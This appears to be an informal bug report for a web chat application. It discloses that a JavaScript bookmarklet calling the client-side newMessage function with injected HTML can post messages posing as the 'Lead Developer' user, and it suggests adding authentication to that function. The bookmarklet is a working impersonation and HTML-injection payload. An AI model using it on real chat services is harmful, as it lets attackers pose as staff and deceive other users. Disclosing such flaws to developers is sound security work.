# so i big problem ~ Lankdev is working on it
you can excuate javascript ie
```js
javascript:msg=prompt("put msg here");newMessage("<a class='red'>[Lead Developer]</a><a class='white'> dudeactualdev: " + msg + "</a>")
```
> above is Intended for js bookmarklet

this will make a popup that will send a message as dude accual dev allowing you to impersonate any body you should chage the `newMessage` function to also handel the auth as in
```js
msg = HAHA
newMessage("<a class='red'>[Lead Developer]</a><a class='white'> dudeactualdev: " + msg + "</a>")
```
would return 
```html
<a class='pink'>[Sucker]</a><a class='white'> hacker: </a><a class='red'>[Lead Developer]</a><a class='white'> dudeactualdev: HAHA</a>
```